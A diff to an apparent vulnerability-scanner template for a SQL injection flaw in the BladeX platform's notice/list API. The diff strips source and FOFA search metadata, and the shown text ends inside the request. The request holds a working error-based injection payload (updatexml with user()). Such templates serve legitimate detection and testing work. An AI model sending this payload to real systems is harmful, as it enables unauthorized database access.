@@ -3,12 +3,8 @@ info:
   name: BladeX企业级开发平台notice-list存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sknx95k2k1ch071k'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: sknx95k2k1ch071k
-    fofa: body="https://bladex.vip"
 http:
 - raw:
   - 'GET /api/blade-desk/notice/list?updatexml(1,concat(0x7e,user(),0x7e),1)=1 HTTP/1.1
